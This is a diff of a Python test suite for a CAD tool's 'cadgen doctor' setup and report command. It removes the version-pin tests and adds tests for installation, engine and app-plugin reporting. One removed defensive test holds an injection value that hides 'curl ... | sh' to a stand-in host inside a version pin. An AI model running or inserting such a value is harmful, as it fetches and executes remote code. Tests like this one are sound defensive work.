@@ -1,16 +1,14 @@
-"""``cadgen doctor`` — the one user-facing pin/version check the skills teach.
+"""``cadgen doctor`` — the skills' one-time setup step and the repair command: it registers the
+installation where none is current, writes the ``cadgen`` command, makes the CAD kernel environment,
+starts the engine, and reports what the device runs -- the current installation, the releases on
+disk, the last switch, the engine and each app's plugin -- comparing nothing. It exits 0, or 4 when
+the CAD kernel is installed but cannot be loaded -- naming Smart App Control on Windows, where a
+refused ``OCP`` load is otherwise a bare ImportError. A kernel that is simply absent is reported and
+exits 0: the release workflow installs the wheel --no-deps and runs doctor as its smoke test.
 
-The per-verb shims that used to enforce the pin on every invocation are gone;
-doctor re-homes that value as an explicit command, so its contract is pinned here:
-report the install, resolve a SKILL.md from a file/dir/cwd, exit 0 on
-match-or-nothing-to-check, exit 3 (the historical shim code) on a mismatch, and
-exit 4 when the CAD kernel is installed but cannot be loaded -- naming Smart App
-Control on Windows, where a refused ``OCP`` load is otherwise a bare
-ImportError. A kernel that is simply absent is reported and exits 0: the release
-workflow installs the wheel --no-deps and runs doctor as its smoke test.
-
-The kernel probe is a fresh-interpreter ``import OCP``; it is stubbed here so
-the contract tests cost no kernel load, and exercised once for real.
+The kernel probe is a fresh-interpreter ``import OCP``; it is stubbed here so the contract tests cost
+no kernel load, and exercised once for real. The apps are read by a stand-in: no test reads the
+developer's own apps.
 """
 
 from __future__ import annotations
@@ -42,16 +40,15 @@ def _run(argv: list[str]) -> tuple[int, str, str]:
 REFUSED = "ImportError: DLL load failed while importing OCP: Access is denied."
 
 
-def skill_text(version: str) -> str:
-    """A SKILL.md whose launch command pins ``version``, as the release stamps one."""
-    return f"- `cadgen` means `uvx --no-config --managed-python --python 3.13 --from cadgen=={version} cadgen`\n"
-
-
 class DoctorTests(unittest.TestCase):
     def setUp(self) -> None:
         patcher = mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_OK, "/site/OCP.pyd"))
         patcher.start()
         self.addCleanup(patcher.stop)
+        self.apps = doctor._apps  # the real one, which one test reads; the rest read no apps
+        apps = mock.patch.object(doctor, "_apps", return_value=[])
+        apps.start()
+        self.addCleanup(apps.stop)
         # The report reads what CAD's apps share from the state directory: a fresh one, never this machine's.
         state = TemporaryDirectory()
         self.addCleanup(state.cleanup)
@@ -82,14 +79,14 @@ class DoctorTests(unittest.TestCase):
         command = installations.proxy_path(str(self.state / "bin"))
         with TemporaryDirectory() as tmp, mock.patch.object(installations, "targets", return_value=found), \
                 mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "1.2.3-dev.1"}):
-            _, out, _ = _run([tmp])
-            again = _run([tmp])[1]
+            _, out, _ = _run([])
+            again = _run([])[1]
             with mock.patch.dict("os.environ", {"PATH": os.pathsep.join([os.path.dirname(command),
                                                                          os.environ.get("PATH", "")])}):
-                on_path = _run([tmp])[1]
+                on_path = _run([])[1]
             for path in found[:2]:
                 Path(path).unlink()
-            gone = _run([tmp])[1]
+            gone = _run([])[1]
             pruned = _run(["--prune"])[1]
         self.assertIn(f"registry {record} registered\n", out)
         # Its folder off PATH: the full path to run it by, until the folder is on it.
@@ -121,7 +118,7 @@ class DoctorTests(unittest.TestCase):
             (folder, str(venv), ""),
         ):
             with self.subTest(first=first), mock.patch.dict("os.environ", {"PATH": os.pathsep.join([first, second])}):
-                code, out, err = _run(["--no-server", str(self.state)])
+                code, out, err = _run(["--no-server"])
             self.assertEqual((code, err), (0, ""))
             # Windows PATH lookup can use PATHEXT's .EXE spelling for the fixture's .exe file.
             self.assertIn(os.path.normcase(f"command  {command} OK{hint}\n"), os.path.normcase(out))
@@ -130,11 +127,11 @@ class DoctorTests(unittest.TestCase):
         # that environment's own `cadgen` script is this installation, not another one.
         with mock.patch.object(sys, "prefix", str(venv.parent)), \
                 mock.patch.dict("os.environ", {"PATH": os.pathsep.join([str(venv), folder])}):
-            self.assertIn(f"command  {command} OK\n", _run(["--no-server", str(self.state)])[1])
+            self.assertIn(f"command  {command} OK\n", _run(["--no-server"])[1])
         if os.name != "nt":
             other.chmod(0o644)  # an earlier non-executable file does not shadow the command
             with mock.patch.dict("os.environ", {"PATH": os.pathsep.join([str(venv), folder])}):
-                self.assertIn(f"command  {command} OK\n", _run(["--no-server", str(self.state)])[1])
+                self.assertIn(f"command  {command} OK\n", _run(["--no-server"])[1])
 
     def test_doctor_through_the_proxy_names_a_development_installation_by_its_version(self) -> None:
         """A development install run through the ``cadgen`` command, with nothing in its environment
@@ -150,29 +147,13 @@ class DoctorTests(unittest.TestCase):
         environment = {key: value for key, value in os.environ.items() if key != installations.NAME_ENV}
         environment["PYTHONPATH"] = str(Path(cadgen.__file__).resolve().parent.parent)  # this cadgen, however installed
         done = subprocess.run([sys.executable, "-P", "-m", "cadgen._internal.proxy", "+1.2.3-dev.1", "doctor",
-                               "--no-server", str(self.state)], capture_output=True, text=True, env=environment,
-                              timeout=300)
+                               "--no-server"], capture_output=True, text=True, env=environment, timeout=300)
         self.assertEqual(done.returncode, 0, done.stderr)
         lines = done.stdout.splitlines()
         self.assertEqual(lines[0], "cadgen 1.2.3-dev.1")
         record = self.state / "installations" / "1.2.3-dev.1.json"
         self.assertEqual([line.strip() for line in lines if line.strip().startswith("registry")],
                          [f"registry {record} OK"])
-
-    def test_a_development_installs_pin_is_the_version_it_runs_as(self) -> None:
-        """A SKILL.md a development install wrote names `cadgen +<version>-dev.<time>`: OK for that
-        installation, a mismatch for another."""
-        with TemporaryDirectory() as tmp:
-            skill = Path(tmp) / "SKILL.md"
-            skill.write_text("- `cadgen` below means `cadgen +0.8.0-dev.20261025032333`\n", encoding="utf-8")
-            with mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "0.8.0-dev.20261025032333"}):
-                code, out, _ = _run(["--no-server", tmp])
-            self.assertEqual(code, 0, out)
-            self.assertIn("pin      OK — cadgen==0.8.0-dev.20261025032333", out)
-            with mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "0.8.0-dev.1"}):
-                code, _, err = _run(["--no-server", tmp])
-            self.assertEqual(code, 3)
-            self.assertIn("pins cadgen==0.8.0-dev.20261025032333, but cadgen 0.8.0-dev.1 is installed", err)
 
     @unittest.skipIf(os.name == "nt", "the legacy pair on POSIX: a symlink and an sh script")
     def test_prune_removes_the_per_version_launchers_earlier_builds_published(self) -> None:
@@ -209,24 +190,24 @@ class DoctorTests(unittest.TestCase):
 
     def test_a_source_tree_registers_nothing_unless_named(self) -> None:
         with TemporaryDirectory() as tmp:
-            _, out, _ = _run([tmp])
+            _, out, _ = _run([])
         self.assertIn("registry not registered: a source tree registers only as a version it is named", out)
         self.assertFalse((self.state / "bin").exists())
 
     def test_the_report_says_what_cads_apps_share(self) -> None:
         with TemporaryDirectory() as tmp:
-            _, out, _ = _run([tmp])
+            _, out, _ = _run([])
         self.assertIn("sharing  off: not until a cadgen command says so", out)
         # Told, and nothing chosen: on by default, from the day it was said.
         (self.state / "settings.json").write_text('{"telemetry": {"notifiedAt": 1790000000, "notice": 1}}', encoding="utf-8")
         with TemporaryDirectory() as tmp:
-            _, out, _ = _run([tmp])
+            _, out, _ = _run([])
         self.assertRegex(out, r"sharing  on: by default, since cadgen said so on \d{4}-\d{2}-\d{2}\n")
 
     def test_the_report_starts_the_engine_when_none_runs(self) -> None:
         # In a sandbox that cannot start one, the client's own line, and nothing started.
         with TemporaryDirectory() as tmp:
-            code, out, _ = _run([tmp])
+            code, out, _ = _run([])
         self.assertEqual(code, 0)
         self.assertRegex(out, r"server   not running \(.+\): no engine server is running, and this shell's sandbox cannot start one")
         self.assertFalse((self.state / "engine").exists(), "nothing started")
@@ -236,30 +217,30 @@ class DoctorTests(unittest.TestCase):
         answer = {"pid": 4242, "workers": [{"script": "a.py"}], "standby": {"pid": 4343}, "cap": 10,
                   "version": "0.8.0", "installation": "0.8.0-dev.2"}
         with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request", return_value=answer):
-            _, out, _ = _run([tmp])
+            _, out, _ = _run([])
         self.assertRegex(out, r"server   running, pid 4242, cadgen 0\.8\.0-dev\.2, workers 2/10 with the standby \(.+\)\n")
         with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request",
                                                      return_value={**answer, "installation": None}):
-            self.assertRegex(_run([tmp])[1], r"server   running, pid 4242, cadgen 0\.8\.0, workers 2/10")
+            self.assertRegex(_run([])[1], r"server   running, pid 4242, cadgen 0\.8\.0, workers 2/10")
         from cadgen.engine.cli import status_text
 
         self.assertIn(" · workers 2/10 with the standby · ", status_text({**answer, "up": 1}))
         answer = {"pid": 4242, "workers": [{"script": "a.py"}, {"script": "b.py"}], "standby": None, "cap": 10,
                   "installation": "0.8.0-dev.2"}
         with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request", side_effect=[None, answer]) as asked:
-            _, out, _ = _run([tmp])
+            _, out, _ = _run([])
         self.assertEqual([call.kwargs["start"] for call in asked.call_args_list], [False, True])
         self.assertRegex(out, r"server   started, pid 4242, cadgen 0\.8\.0-dev\.2, workers 2/10 \(.+\)\n")
         # --no-server: everything else, and the engine only asked about, never started.
         with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request", return_value=None) as asked:
-            code, out, _ = _run(["--no-server", tmp])
+            code, out, _ = _run(["--no-server"])
         self.assertEqual((code, [call.kwargs["start"] for call in asked.call_args_list]), (0, [False]))
         self.assertRegex(out, r"server   not running \(.+\); a build starts it outside a sandbox; inside one, "
                               r"run `cadgen server` outside first\n")
 
     def test_the_report_names_the_kernel_it_loaded(self) -> None:
         with TemporaryDirectory() as tmp:
-            code, out, _ = _run([tmp])
+            code, out, _ = _run([])
         self.assertEqual(code, 0)
         self.assertIn("kernel   OK", out)
         self.assertIn("/site/OCP.pyd", out)
@@ -271,7 +252,7 @@ class DoctorTests(unittest.TestCase):
 
         refused = base.Refused("the CAD kernel environment needs the network once: dns error")
         with mock.patch.object(base, "ensure", side_effect=refused), TemporaryDirectory() as tmp:
-            code, out, err = _run([tmp])
+            code, out, err = _run([])
         self.assertEqual(code, 0)
         self.assertIn("  kernel   not made — the CAD kernel environment needs the network once: dns error\n", out)
         self.assertNotIn("FAILED", err)
@@ -286,8 +267,8 @@ class DoctorTests(unittest.TestCase):
             return made
 
         with mock.patch.object(base, "ensure", side_effect=ensure) as asked, TemporaryDirectory() as tmp:
-            code, out, _err = _run([tmp])
-            _code, quiet, _err = _run(["--no-server", tmp])
+            code, out, _err = _run([])
+            _code, quiet, _err = _run(["--no-server"])
         self.assertEqual(code, 0)
         self.assertEqual([call.kwargs["make"] for call in asked.call_args_list], [True, False],
                          "--no-server makes nothing: it says whether it is there")
@@ -300,97 +281,76 @@ class DoctorTests(unittest.TestCase):
     def test_a_kernel_that_will_not_load_exits_4(self) -> None:
         with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
                 mock.patch.object(sys, "platform", "linux"), TemporaryDirectory() as tmp:
-            code, out, err = _run([tmp])
+            code, out, err = _run([])
         self.assertEqual(code, 4)
         self.assertIn("kernel   FAILED", err)
         self.assertIn(REFUSED, err, "the exception line is the evidence")
         self.assertNotIn("Smart App Control", err, "off Windows the cause is not known")
-        self.assertIn("pin      none found", out, "the rest of the report still prints")
+        self.assertIn("sharing", out, "the rest of the report still prints")
 
     def test_a_refused_load_on_windows_names_smart_app_control(self) -> None:
         with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
                 mock.patch.object(sys, "platform", "win32"), TemporaryDirectory() as tmp:
-            code, _, err = _run([tmp])
+            code, _, err = _run([])
         self.assertEqual(code, 4)
         self.assertIn("Smart App Control", err)
         self.assertIn("3077", err)
 
-    def test_a_pin_mismatch_outranks_the_kernel(self) -> None:
-        # The install is wrong before the kernel is: fixing the pin may fix both.
-        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
-                TemporaryDirectory() as tmp:
-            (Path(tmp) / "SKILL.md").write_text(skill_text("0.0.0.dev0"), encoding="utf-8")
-            code, _, err = _run([tmp])
-        self.assertEqual(code, 3)
-        self.assertIn("kernel   FAILED", err)
-        self.assertIn("MISMATCH", err)
+    def test_the_report_says_what_the_device_runs(self) -> None:
+        from cadgen._internal import installations, releases, switch
 
-    def test_matching_pin_passes_and_names_the_file(self) -> None:
-        with TemporaryDirectory() as tmp:
-            skill = Path(tmp) / "SKILL.md"
-            skill.write_text(skill_text(cadgen.__version__), encoding="utf-8")
-            code, out, _ = _run([str(skill)])
-        self.assertEqual(code, 0)
-        self.assertIn("OK", out)
-        self.assertIn(str(skill), out)
+        for version in ("1.0.0", "1.1.0"):
+            folder = releases.where(version)
+            (folder / "bin").mkdir(parents=True)
+            for name in ("cadgen", "python"):
+                (folder / "bin" / name).write_text("", encoding="utf-8")
+            (folder / releases.MARKER).write_text('{"schema": "%s", "version": "%s"}' % (releases.SCHEMA, version),
+                                                  encoding="utf-8")
+            installations.register(version, (str(folder / "bin" / "cadgen"), str(folder / "bin" / "python"), str(folder)))
+        installations.point("1.1.0")
+        switch._record({"from": "1.0.0", "to": "1.1.0", "ok": True, "gapMs": 640, "at": "2026-10-31T09:00:00+0000"})
+        code, out, _ = _run(["--no-server"])
+        self.assertEqual(code, 0, out)
+        self.assertIn(f"  current  cadgen 1.1.0 ({releases.where('1.1.0')})\n", out)
+        self.assertIn(f"  releases 1.0.0, 1.1.0 (current) in {releases.root()}\n", out)
+        self.assertIn("  update   2026-10-31T09:00:00+0000: switched to cadgen 1.1.0 from 1.0.0, 640 ms without an "
+                      "engine\n", out)
+        # Another installation's doctor (a skill's one-time step run by uvx) registers nothing and leaves
+        # the CAD kernel to the current one's.
+        self.assertIn("registry cadgen 1.1.0 is the current installation: this one registers nothing", out)
+        self.assertIn("kernel   not made — the current installation's (cadgen 1.1.0): its `cadgen doctor` checks it", out)
+        self.assertEqual(sorted(record["version"] for record in installations.records()), ["1.0.0", "1.1.0"])
 
-    def mismatch(self, editable: str | None) -> tuple[int, str]:
-        with mock.patch.object(doctor, "_editable_source", return_value=editable), \
-                TemporaryDirectory() as tmp:
-            (Path(tmp) / "SKILL.md").write_text(skill_text("0.0.0.dev0"), encoding="utf-8")
-            code, _, err = _run([tmp])
-        return code, err
+    def test_the_report_names_each_app_s_plugin(self) -> None:
+        from cadgen._internal import providers
 
-    def test_mismatch_exits_3_with_the_install_instruction(self) -> None:
-        code, err = self.mismatch(None)
-        self.assertEqual(code, 3)
-        self.assertIn("MISMATCH", err)
-        self.assertIn("--from cadgen==0.0.0.dev0 cadgen", err, "the skill's own launch command runs its pin")
+        class Copy:
+            def __init__(self, version: str) -> None:
+                self.version = version
 
-    def test_a_pin_that_is_no_version_is_never_printed_as_a_command(self) -> None:
-        # A SKILL.md in a downloaded project, run from: its "pin" is a shell command.
-        with mock.patch.object(doctor, "_editable_source", return_value=None), TemporaryDirectory() as tmp:
-            (Path(tmp) / "SKILL.md").write_text(skill_text("0.8.0;curl${IFS}https://example.invalid|sh"), encoding="utf-8")
-            code, _, err = _run([tmp])
-        self.assertEqual(code, 3)
-        self.assertIn("pins no cadgen version", err)
-        self.assertNotIn("uvx", err)
+            def words(self, _machine) -> str:
+                return f"text-to-cad {self.version}"
 
-    def test_an_editable_install_is_told_to_re_record_itself_not_to_replace_itself(self) -> None:
-        # An editable install's version is a snapshot taken when it was
-        # installed, so its code can already BE the pinned version while the
-        # metadata is behind. The skill's launch command would run a published
-        # release instead of the source tree -- the wrong fix.
-        source = str(Path("/src/packages/cadgen"))
-        code, err = self.mismatch(source)
-        self.assertEqual(code, 3)
-        self.assertIn("MISMATCH", err)
-        self.assertIn("EDITABLE", err)
-        self.assertIn(f"pip install -e {source}", err)
-        self.assertIn("recorded when", err, "the report says WHY the version is stale")
-        self.assertNotIn("--from cadgen==", err)
+        class App:
+            def __init__(self, label: str, ours, stores=(), present: bool = True) -> None:
+                self.label, self._ours, self._stores, self.present = label, ours, list(stores), present
 
-    def test_an_editable_source_is_read_off_this_install(self) -> None:
-        # In a checkout cadgen IS editable; a wheel install records no
-        # direct_url.json at all. Either answer is correct, and neither may
-        # raise -- a doctor that crashes reporting a mismatch is worse than the
-        # mismatch.
-        source = doctor._editable_source()
-        if source is not None:
-            self.assertTrue(Path(source).is_dir(), source)
+            def ours(self):
+                return self._ours
 
-    def test_an_unreadable_direct_url_record_is_not_editable(self) -> None:
-        class Record:
-            def __init__(self, text: str | None) -> None:
-                self.text = text
+            def stores(self):
+                return self._stores
 
-            def read_text(self, _name: str) -> str | None:
-                return self.text
-
-        for text in (None, "", "{not json", "[]", '{"url": "file:///s"}', '{"dir_info": {}}'):
-            with self.subTest(text=text):
-                with mock.patch("importlib.metadata.distribution", return_value=Record(text)):
-                    self.assertIsNone(doctor._editable_source())
+        found = {"claude": App("Claude Code", Copy("1.1.0")), "codex": App("Codex", Copy("1.2.0")),
+                 "claude-desktop": App("Claude Desktop", Copy("1.1.0")), "cursor": App("Cursor", None, [Copy("1.0.0")]),
+                 "gemini": App("Gemini CLI", None, present=False)}
+        with mock.patch.object(providers.Machine, "here"), mock.patch.object(providers, "detect", return_value=found):
+            lines = self.apps()
+        self.assertEqual(lines, ["app      Claude Code: text-to-cad 1.1.0", "app      Codex: text-to-cad 1.2.0",
+                                 "app      Claude Desktop: cadgen 1.1.0",
+                                 "app      Cursor: text-to-cad 1.0.0, which its store updates"])
+        with mock.patch.object(providers.Machine, "here", side_effect=OSError("no home")):
+            self.assertEqual(self.apps(), ["apps     unknown (OSError: no home)"])
 
 
 class PrivateFolders(unittest.TestCase):
@@ -482,7 +442,7 @@ class LeftoversTest(PrivateFolders):
         before = self.tree()
 
         with mock.patch.object(installations, "targets", return_value=None):
-            code, out, _ = _run(["--no-server", str(self.root)])
+            code, out, _ = _run(["--no-server"])
         self.assertEqual(code, 0)
         self.assertIn("  leftover 2 engine records of an older format, 1 bytecode folder of installations no longer "
                       "registered (2.0 KB), 1 cache folder with no record (4.0 KB), 1 file an earlier 0.8 build kept "
@@ -539,7 +499,7 @@ class SevenLeftoversTest(PrivateFolders):
     def test_a_quiet_0_7_is_said_with_its_size_and_age_and_pruned(self) -> None:
         made, ours = self.seven(), self.ours()
         said = f"cadgen 0.7's store and 4 state files (4.0 KB), last written {self.last(made)}"
-        code, out, _ = _run(["--no-server", str(self.root)])
+        code, out, _ = _run(["--no-server"])
         self.assertEqual(code, 0)
         self.assertIn(f"  0.7      {said}: cadgen doctor --prune removes it\n", out)
         self.assertTrue(all(path.exists() for path in made), "nothing is removed without --prune")
@@ -549,12 +509,12 @@ class SevenLeftoversTest(PrivateFolders):
                      "state/recents/recents.jsonl", "state/install-channels.json.lock"):
             self.assertFalse((self.root / gone).exists(), gone)
         self.assertTrue(all(path.exists() for path in ours), "0.8's own files stay")
-        self.assertNotIn("0.7", _run(["--no-server", str(self.root)])[1])
+        self.assertNotIn("0.7", _run(["--no-server"])[1])
 
     def test_a_0_7_written_in_the_last_week_stays_until_all_versions_says_none_needs_it(self) -> None:
         made, ours = self.seven(recent="state/viewer.log"), self.ours()
         said = f"cadgen 0.7's store and 5 state files (4.0 KB), last written {self.last(made)}"
-        code, out, _ = _run(["--no-server", str(self.root)])
+        code, out, _ = _run(["--no-server"])
         self.assertIn(f"  0.7      {said}: cadgen doctor --prune removes it once nothing has written it for 7 days, "
                       "or now with --all-versions\n", out)
         code, out, _ = _run(["--prune"])
